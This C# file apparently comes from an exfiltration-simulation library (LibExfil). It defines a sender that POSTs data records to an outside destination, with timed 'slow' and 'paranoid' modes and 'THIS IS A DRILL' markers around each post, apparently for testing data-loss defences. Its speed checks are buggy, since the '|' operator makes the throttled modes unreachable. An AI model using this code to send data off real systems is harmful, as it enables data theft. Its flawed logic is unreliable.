using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using LibExfil.Structures;
using System.Net.Http;
using System.Net.Sockets;
using System.Web;
using System.Net;
using System.Threading;
using System.Security.Cryptography;

namespace LibExfil.DataSenders
{
    public class HttpPostSender:IBaseSenderInterface
    {
        readonly Options ops;

        public HttpPostSender(Options ops=Options.NONE)
        { this.ops = ops; }

        /// <summary>
        /// This sends data as a http post request.  As a post can be very long, "THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL" is appended to the beginnning and end of the post
        /// </summary>
        /// <param name="records">the data records to send from </param>
        public int Send(DataRecordCollection data, string destination)
        {

            if ((ops & Options.SPEED_MODERATE) != 0)
                return ModerateSend(data, destination);

            else if ((ops | Options.SPEED_FAST) != 0)
                return FastSend(data, destination);

            else if ((ops | Options.SPEED_SLOW) != 0)
                return SlowSend(data, destination);

            else if ((ops | Options.SPEED_PARANOID) != 0)
                return ParanoidSend(data, destination);

            else
                return ModerateSend(data, destination);
        }

        private int ParanoidSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;

                DataRecord dr = (DataRecord)dd;
                sent += DoWork(dr,keys, finalURL, destination);
                Console.WriteLine("Paranoid.  Sleeping 60 seconds");
                Thread.Sleep(60000);
            }
            return sent;
        }
        private int SlowSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;

                DataRecord dr = (DataRecord)dd;
                sent += DoWork(dr, keys, finalURL, destination);
                Console.WriteLine("Sent. Sleeping 5 seconds");
                Thread.Sleep(5000);
            }
            return sent;
        }
        private int ModerateSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;

                DataRecord dr = (DataRecord)dd;
                sent += DoWork(dr, keys,finalURL, destination);
            }
            return sent;
        }
        private int FastSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;
                DataRecord dr = (DataRecord)dd;
                Task t = Task.Run(() =>
                { sent += DoWork(dr,keys, finalURL, destination); });
                tasks.Add(t);
            }
            foreach (Task t in tasks) t.Wait(); //wait to finsih all requests before we move on.
            return sent;
        }
        private int DoWork(DataRecord dr, string[] keys,string finalURL,string destination)
        {
            
            string[] vals = dr.Data;
            Dictionary<string, string> postData = new Dictionary<string, string>();
            postData.Add("BEGIN_INFO", "THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL");  //add this header so we know its a drill
            for (int i = 0; i < keys.Count(); i++)
            {
                string key = keys[i];
                string val = vals[i];
                postData.Add(keys[i], vals[i]);

            }
            postData.Add("END_INFO", "THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL");
            var content = new FormUrlEncodedContent(postData);
            using (var httpClient = new HttpClient())
            {
                try
                {
                    //Console.WriteLine("[+] - GET URI: "+ finalURL+System.Environment.NewLine);
                    var result = httpClient.PostAsync(finalURL, content);  //no await.  async and go.  We dont care about a response.
                    result.Wait();
                }
                catch (SocketException e1) { Console.WriteLine("Socket Exception+ host: " + destination + " is refusing our connections"); }
                catch (WebException e2) { Console.WriteLine("Web Exception+ host: " + destination + " message: " + e2.Message); }
                catch (HttpRequestException e3) { Console.WriteLine("Web Exception+ host: " + destination + "message: " + e3.Message); }
            }
            return 1;
        }
    }
}

